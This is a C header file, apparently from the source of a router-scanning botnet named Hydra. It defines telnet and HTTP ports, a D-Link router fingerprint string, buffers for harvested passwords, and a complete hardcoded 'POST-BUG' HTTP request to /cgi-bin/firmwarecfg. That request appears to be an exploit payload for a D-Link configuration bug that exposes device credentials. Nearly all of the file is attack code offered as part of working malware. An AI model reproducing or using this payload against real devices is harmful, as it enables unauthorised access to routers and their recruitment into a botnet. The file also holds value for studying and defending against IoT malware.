#ifndef __HYDRA_SCAN_H
#define __HYDRA_SCAN_H

/* telnet port 23/tcp. */
#define telnet_port (23)
#define http_port   (80)

/* d-link id string. */
#define router_id "ÿýÿý!ÿûÿû"

/* variables & misc. */
unsigned short founds;
char psw_x[32], psw_y[32];
char __netbuf[sizebuf];

struct timeval tm;
int timeout_value;

sock_t *scan_sp;

/* POST-BUG request. */
#define post_request "POST /cgi-bin/firmwarecfg HTTP/1.1\r\n" \
"Host: $IP\r\n" \
"User-Agent: veryprivateacsor\r\n" \
"Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n" \
"Accept-Language: en-us,en;q=0.5\r\n" \
"Accept-Encoding: gzip,deflate\r\n" \
"Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n" \
"Keep-Alive: 300\r\n" \
"Connection: keep-alive\r\n" \
"Content-Type: multipart/form-data; \r\n" \
"boundary=---------------------------41184676334\r\n" \
"Content-Length: 234\r\n" \
"\r\n" \
"-----------------------------41184676334\r\n" \
"Content-Disposition: form-data; name=\"config.x\"\r\n" \
"\r\n" \
"\r\n" \
"-----------------------------41184676334\r\n" \
"Content-Disposition: form-data; name=\"config.y\"\r\n" \
"\r\n" \
"\r\n" \
"-----------------------------41184676334--\r\n"

#endif
